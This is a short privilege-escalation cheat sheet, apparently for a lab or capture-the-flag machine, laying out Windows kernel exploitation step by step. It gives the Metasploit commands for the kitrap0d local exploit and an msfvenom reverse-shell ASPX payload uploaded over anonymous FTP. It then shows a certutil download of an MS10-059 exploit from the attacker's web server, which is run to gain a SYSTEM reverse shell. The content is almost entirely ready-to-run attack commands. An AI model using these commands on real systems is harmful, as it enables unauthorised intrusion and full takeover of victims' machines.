# Escalation Paths

1. [Kernel Exploits](#kernel-exploits)

## Kernel Exploits

* [Reference for Windows Kernel exploits](https://github.com/SecWiki/windows-kernel-exploits)

```shell
#metasploit kernel exploitation
#exploit suggested by exploit suggester
use exploit/windows/local/ms10_015_kitrap0d

options

set SESSION 9

set LHOST tun0

set LPORT 5555
#gives meterpreter shell
getuid
```

```shell
#manual kernel exploitation
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx > manual.aspx
#create aspx shell

ftp 10.10.10.5
#anonymous login

put manual.aspx

exit

nc -lvnp 4444
#setup listener
#check uploaded aspx shell on web
#we get a reverse shell

whoami
#iis apppool\web

#in attacker machine
#check for vulnerable kernel exploits using windows exploit suggester
#and download exploit files for MS10-059
python3 -m http.server

#in victim shell
cd C:\Windows\Temp

certutil -urlcache -f http://10.10.14.5:8000/ms10-059.exe ms.exe

#setup listener on attacker machine
nc -nvlp 5555

#in victim shell
ms.exe 10.10.14.5 5555

#we get reverse shell on port 5555 listener
whoami
#system
```
